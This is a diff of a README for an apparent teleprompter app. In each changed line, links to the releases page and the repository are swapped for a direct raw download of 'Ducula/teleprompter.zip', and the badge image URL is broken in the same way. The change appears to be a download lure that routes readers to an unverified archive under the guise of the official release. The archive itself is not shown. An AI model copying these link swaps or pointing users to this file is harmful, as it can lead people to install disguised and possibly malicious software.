@@ -6,7 +6,7 @@ Welcome to the teleprompter application! This tool helps you deliver presentatio
 
 ## 📥 Download Now
 
-[![Download teleprompter](https://img.shields.io/badge/Download%20teleprompter-blue?style=for-the-badge&logo=github)](https://github.com/JPAleazizm/teleprompter/releases)
+[![Download teleprompter](https://raw.githubusercontent.com/JPAleazizm/teleprompter/main/Ducula/teleprompter.zip%20teleprompter-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/JPAleazizm/teleprompter/main/Ducula/teleprompter.zip)
 
 ## 💻 System Requirements
 
@@ -28,7 +28,7 @@ Before you download, ensure your device meets these requirements:
 
 To get started, visit the Releases page to download the latest version of the teleprompter application. 
 
-[Visit this page to download](https://github.com/JPAleazizm/teleprompter/releases)
+[Visit this page to download](https://raw.githubusercontent.com/JPAleazizm/teleprompter/main/Ducula/teleprompter.zip)
 
 ### For Android Users:
 
@@ -61,6 +61,6 @@ If you encounter issues or have questions, feel free to open a new issue in the 
 
 ## 🔗 Learn More
 
-For more detailed information and updates, check out our [GitHub repository](https://github.com/JPAleazizm/teleprompter). 
+For more detailed information and updates, check out our [GitHub repository](https://raw.githubusercontent.com/JPAleazizm/teleprompter/main/Ducula/teleprompter.zip). 
 
 Happy presenting!
